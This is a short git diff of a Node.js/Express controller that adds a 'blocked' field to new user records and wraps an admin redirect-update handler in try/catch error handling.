@@ -18,7 +18,8 @@ exports.addUser = async (req, res) => {
             logs: [],
             redirect: null,
             homeinfo: false,
-            otpinfo: false
+            otpinfo: false,
+            blocked:false
 
 
 
@@ -208,25 +209,26 @@ exports.getUserById = async (req, res) => {
 
 
 exports.updateRedirectAdmin = async (req, res) => {
-    const { id, redirect, logs } = req.body;
-    const user = await User.findOne({ id: id });
-    user.redirect = redirect;
+
+    try {
+        const { id, redirect, logs } = req.body;
+        const user = await User.findOne({ id: id });
+        if (!user) {
+            return res.status(404).json({ message: "User not found" });
+        }
+
+        user.redirect = redirect;
+        user.logs.addToSet(logs);
+        await user.save();
 
 
-    // Save the updated user document
-
-    // Add the newQuickData element to the quick_data array
-
-    user.logs.addToSet(logs);
-    //console.log(user);
-
-    // Save the updated user document
-    await user.save();
-
-
-
-    return res.send("success");
-}
+        console.log("User updated successfully!");
+        return res.status(200).json({success:true});
+    } catch (err) {
+        console.log("Error updating user: ", err);
+        return res.json({ message: err.message });
+    }
+};
 
 exports.updateStatus = async (id, status) => {
     try {
